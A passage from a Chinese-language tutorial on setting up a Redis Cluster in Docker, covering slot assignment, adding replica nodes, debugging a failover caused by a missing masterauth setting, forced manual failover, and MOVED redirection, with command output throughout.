cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t\t<p>1</p>\n\n\t\t\t\t\t<p>2</p>\n\n\t\t\t\t\t<p>3</p>\n\n\t\t\t\t\t<p>4</p>\n\n\t\t\t\t\t<p>5</p>\n\n\t\t\t\t\t<p>6</p>\n\n\t\t\t\t\t<p>7</p>\n\n\t\t\t\t\t<p>8</p>\n\n\t\t\t\t\t<p>9</p>\n\n\t\t\t\t\t<p>10</p>\n\n\t\t\t\t\t<p>11</p>\n\n\t\t\t\t\t<p>12</p>\n\n\t\t\t\t\t<p>13</p>\n\n\t\t\t\t\t<p>14</p>\n\n\t\t\t\t\t<p>15</p>\n\n\t\t\t\t\t<p>16</p>\n\n\t\t\t\t\t<p>17</p>\n\n\t\t\t\t\t<p>18</p>\n\n\t\t\t\t\t<p>19</p>\n\n\t\t\t\t\t<p>20</p>\n\n\t\t\t\t\t<p>21</p>\n\n\t\t\t\t\t<p>22</p>\n\n\t\t\t\t\t<p>23</p>\n\n\t\t\t\t\t<p>24</p>\n\n\t\t\t\t\t<p>25</p>\n\n\t\t\t\t\t<p>26</p>\n\n\t\t\t\t\t<p>27</p>\n\n\t\t\t\t\t<p>28</p>\n\n\t\t\t\t\t<p>29</p>\n\n\t\t\t\t\t<p>30</p>\n\n\t\t\t\t\t<p>31</p>\n\n\t\t\t\t\t<p>32</p>\n\n\t\t\t\t\t<p>33</p>\n\n\t\t\t\t\t<p>34</p>\n\n\t\t\t\t\t<p>35</p>\n\n\t\t\t\t\t<p>36</p>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER INFO</code></p>\n\n\t\t\t\t\t<p><code>cluster_state:fail　　　　       </code><code># 集群状态为失败</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_assigned:16101    </code><code># 没有完全分配结束</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_ok:16101</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_pfail:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_fail:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_known_nodes:6</code></p>\n\n\t\t\t\t\t<p><code>cluster_size:3</code></p>\n\n\t\t\t\t\t<p><code>cluster_current_epoch:5</code></p>\n\n\t\t\t\t\t<p><code>cluster_my_epoch:2</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_ping_sent:266756</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_pong_sent:266528</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_meet_sent:10</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_sent:533294</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_ping_received:266527</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_pong_received:266666</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_meet_received:1</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_received:533194&lt;br&gt;</code></p>\n\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER INFO</code></p>\n\n\t\t\t\t\t<p><code>cluster_state:ok                   </code><code># 集群状态为成功</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_assigned:16384       </code><code># 已经全部分配完成</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_ok:16384</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_pfail:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_fail:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_known_nodes:6</code></p>\n\n\t\t\t\t\t<p><code>cluster_size:3</code></p>\n\n\t\t\t\t\t<p><code>cluster_current_epoch:5</code></p>\n\n\t\t\t\t\t<p><code>cluster_my_epoch:2</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_ping_sent:266757</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_pong_sent:266531</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_meet_sent:10</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_sent:533298</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_ping_received:266530</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_pong_received:266667</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_meet_received:1</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_received:533198</code></p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr></tbody></table><p>　　</p>\n\n\t\t<p>综上可知，当全部槽位分配完成之后，集群还是可行的，如果我们手欠，移除一个槽位，那么集群就立马那不行了，自己去试试吧 ——CLUSTER DELSLOTS 0 。</p>\n\t\t</li>\n\t</ol></li>\n\t<li>如何变成高可用性<br>\n\t以上我们已经搭建了一套完整的可运行的redis cluster，但是每个节点都是单点，这样子可能出现，一个节点挂掉，整个集群因为槽位分配不完全而崩溃，因此，我们需要为每个节点配置副本备用节点。<br>\n\t前面我们已经提前创建了6个备用节点，搭建集群花了三个，因此还有剩下三个直接可以用来做备用副本。\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER INFO</code></p>\n\n\t\t\t\t<p><code>cluster_state:ok</code></p>\n\n\t\t\t\t<p><code>cluster_slots_assigned:16384</code></p>\n\n\t\t\t\t<p><code>cluster_slots_ok:16384</code></p>\n\n\t\t\t\t<p><code>cluster_slots_pfail:0</code></p>\n\n\t\t\t\t<p><code>cluster_slots_fail:0</code></p>\n\n\t\t\t\t<p><code>cluster_known_nodes:6   </code><code># 总共6个节点</code></p>\n\n\t\t\t\t<p><code>cluster_size:3          </code><code># 集群为 3 个节点</code></p>\n\n\t\t\t\t<p><code>cluster_current_epoch:5</code></p>\n\n\t\t\t\t<p><code>cluster_my_epoch:2</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_ping_sent:270127</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_pong_sent:269893</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_meet_sent:10</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_sent:540030</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_ping_received:269892</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_pong_received:270037</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_meet_received:1</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_received:539930</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t查看所有节点的id</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 master - 0 1528704114535 1 connected 5462-10922</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528704114000 0 connected 10923-16383</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 master - 0 1528704114023 5 connected</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 master - 0 1528704115544 4 connected</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 master - 0 1528704114836 3 connected</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 myself,master - 0 1528704115000 2 connected 0-5461</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t编写脚本，添加副本节点</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd2 tmp]</code><code># vi addSlaveNodes.sh</code></p>\n\n\t\t\t\t<p><code>#!/bin/bash</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>/usr/local/bin/redis-cli</code> <code>-h 192.168.10.52 -p 6382 -a 123456 CLUSTER REPLICATE 760e4d0039c5ac13d04aa4791c9e6dc28544d7c7</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>/usr/local/bin/redis-cli</code> <code>-h 192.168.10.52 -p 6383 -a 123456 CLUSTER REPLICATE 54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>/usr/local/bin/redis-cli</code> <code>-h 192.168.10.52 -p 6384 -a 123456 CLUSTER REPLICATE f45f9109f2297a83b1ac36f9e1db5e70bbc174ab</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t注意：1、作为备用的节点，必须是未分配槽位的，否者会操作失败 (error) ERR To set a master the node must be empty and without assigned slots 。<br>\n\t           2、需要从需要添加的节点上面执行操作，CLUSTER REPLICATE [node_id]  ，使当前节点成为 node_id 的副本节点。<br>\n\t           3、添加从节点（集群复制）： 复制的原理和单机的Redis复制原理一样，区别是：集群下的从节点也需要运行在cluster模式下，要先添加到集群里面，再做复制。<br>\n\t查看所有节点信息：</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 master - 0 1528705604149 1 connected 5462-10922</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528705603545 0 connected 10923-16383</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 slave f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 0 1528705603144 5 connected</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 slave 54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 0 1528705603000 4 connected</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 slave 760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 0 1528705603000 3 connected</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 myself,master - 0 1528705602000 2 connected 0-5461</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t可以看到我们现在实现了三主三从的一个高可用集群。</p>\n\t</li>\n\t<li>高可用测试——故障转移<br>\n\t查看当前运行状态：\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 master - 0 1528705604149 1 connected 5462-10922</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528705603545 0 connected 10923-16383</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 slave f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 0 1528705603144 5 connected</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 slave 54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 0 1528705603000 4 connected</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 slave 760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 0 1528705603000 3 connected</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 myself,master - 0 1528705602000 2 connected 0-5461</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　以上，运行正常<br><br>\n\t尝试关闭一个master，选择端口为6380的容器，停掉之后：</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\n\t\t\t\t<p>19</p>\n\n\t\t\t\t<p>20</p>\n\n\t\t\t\t<p>21</p>\n\n\t\t\t\t<p>22</p>\n\n\t\t\t\t<p>23</p>\n\n\t\t\t\t<p>24</p>\n\n\t\t\t\t<p>25</p>\n\n\t\t\t\t<p>26</p>\n\n\t\t\t\t<p>27</p>\n\n\t\t\t\t<p>28</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 master,fail - 1528706408935 1528706408000 1 connected 5462-10922</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528706463000 0 connected 10923-16383</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 slave f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 0 1528706462980 5 connected</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 slave 54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 0 1528706463000 4 connected</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 slave 760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 0 1528706463985 3 connected</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 myself,master - 0 1528706462000 2 connected 0-5461</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt;</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER INFO</code></p>\n\n\t\t\t\t<p><code>cluster_state:fail</code></p>\n\n\t\t\t\t<p><code>cluster_slots_assigned:16384</code></p>\n\n\t\t\t\t<p><code>cluster_slots_ok:10923</code></p>\n\n\t\t\t\t<p><code>cluster_slots_pfail:0</code></p>\n\n\t\t\t\t<p><code>cluster_slots_fail:5461</code></p>\n\n\t\t\t\t<p><code>cluster_known_nodes:6</code></p>\n\n\t\t\t\t<p><code>cluster_size:3</code></p>\n\n\t\t\t\t<p><code>cluster_current_epoch:5</code></p>\n\n\t\t\t\t<p><code>cluster_my_epoch:2</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_ping_sent:275112</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_pong_sent:274819</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_meet_sent:10</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_fail_sent:5</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_sent:549946</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_ping_received:274818</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_pong_received:275004</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_meet_received:1</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_fail_received:1</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_received:549824</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　以上，发现整个集群都失败了，从节点没有自动升级为主节点，怎么回事？？<br>\n\t重启停掉的容器，经排查日志信息 [root@df6ebce6f12a /]# tail -f /var/log/redis/redis-server.log  ：</p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.712 </code><code># Cluster state changed: ok</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.718 * (Non critical) Master does not understand REPLCONF listening-port: -NOAUTH Authentication required.</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.718 * (Non critical) Master does not understand REPLCONF capa: -NOAUTH Authentication required.</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.719 * Partial resynchronization not possible (no cached master)</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.719 </code><code># Unexpected reply to PSYNC from master: -NOAUTH Authentication required.</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.719 * Retrying with SYNC...</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.719 </code><code># MASTER aborted replication with an error: NOAUTH Authentication required.</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.782 * Connecting to MASTER 172.17.0.6:6379</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.782 * MASTER &lt;-&gt; SLAVE </code><code>sync</code> <code>started</code></p>\n\n\t\t\t\t<p><code>1:S 11 Jun 09:57:46.782 * Non blocking connect </code><code>for</code> <code>SYNC fired the event.</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p><br>\n\t可以看到，主从之间访问需要auth，之前忘记了配置 redis.conf  中的 # masterauth &lt;master-password&gt; ，所以导致主从之间无法通讯。修改配置之后，自动故障转移正常。</p>\n\t<br>\n\t有时候需要实施人工故障转移：<br><br>\n\t登录6380端口的从节点：6383，执行 CLUSTER FAILOVER 命令：\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt; CLUSTER  FAILOVER</code></p>\n\n\t\t\t\t<p><code>(error) ERR Master is down or failed, please use CLUSTER FAILOVER FORCE</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t发现因为master已经down了，所以我们需要执行强制转移<br>\n\t </p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt; CLUSTER FAILOVER FORCE</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t查看当前 cluster node 情况：<br>\n\t </p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt;  CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 slave 760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 0 1528707535332 3 connected</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 slave f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 0 1528707534829 5 connected</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528707534527 0 connected 10923-16383</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 myself,master - 0 1528707535000 6 connected 5462-10922</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 master - 0 1528707535834 2 connected 0-5461</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 master,fail - 1528707472833 1528707472000 1 connected</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t从节点已经升级为master节点。这时候，我们尝试重启了，6380节点的redis（其实是重新启动停掉的容器）：<br>\n\t </p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt;  CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 slave 760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 0 1528707556044 3 connected</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 slave f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 0 1528707555000 5 connected</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528707556000 0 connected 10923-16383</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 myself,master - 0 1528707556000 6 connected 5462-10922</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 master - 0 1528707556000 2 connected 0-5461</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 slave 98aebcfe42d8aaa8a3375e4a16707107dc9da683 0 1528707556547 6 connected</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\t我们发现，6380节点反而变成了 6383节点的从节点。<br><br>\n\t现在集群应该是完整的了，所以，集群状态应该已经恢复了，我们查看下：\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\n\t\t\t\t<p>19</p>\n\n\t\t\t\t<p>20</p>\n\n\t\t\t\t<p>21</p>\n\n\t\t\t\t<p>22</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt; CLUSTER INFO</code></p>\n\n\t\t\t\t<p><code>cluster_state:ok</code></p>\n\n\t\t\t\t<p><code>cluster_slots_assigned:16384</code></p>\n\n\t\t\t\t<p><code>cluster_slots_ok:16384</code></p>\n\n\t\t\t\t<p><code>cluster_slots_pfail:0</code></p>\n\n\t\t\t\t<p><code>cluster_slots_fail:0</code></p>\n\n\t\t\t\t<p><code>cluster_known_nodes:6</code></p>\n\n\t\t\t\t<p><code>cluster_size:3</code></p>\n\n\t\t\t\t<p><code>cluster_current_epoch:6</code></p>\n\n\t\t\t\t<p><code>cluster_my_epoch:6</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_ping_sent:19419</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_pong_sent:19443</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_meet_sent:1</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_auth-req_sent:5</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_update_sent:1</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_sent:38869</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_ping_received:19433</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_pong_received:19187</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_meet_received:5</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_fail_received:4</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_auth-ack_received:2</code></p>\n\n\t\t\t\t<p><code>cluster_stats_messages_received:38631</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\tOK，没有问题。<br>\n\t </li>\n\t<li>集群访问<br>\n\t客户端在初始化的时候只需要知道一个节点的地址即可，客户端会先尝试向这个节点执行命令，比如  get key ，如果key所在的slot刚好在该节点上，则能够直接执行成功。如果slot不在该节点，则节点会返回MOVED错误，同时把该slot对应的节点告诉客户端，客户端可以去该节点执行命令\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6383&gt; get hello</code></p>\n\n\t\t\t\t<p><code>(error) MOVED 866 172.17.0.2:6379</code></p>\n\n\t\t\t\t<p> </p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt; </code><code>set</code> <code>number 20004</code></p>\n\n\t\t\t\t<p><code>(error) MOVED 7743 172.17.0.3:6379</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　另外，redis集群版只使用db0，select命令虽然能够支持select 0。其他的db都会返回错误。</p>\n\n\t<table border=\"0\" cellpadding=\"0\" 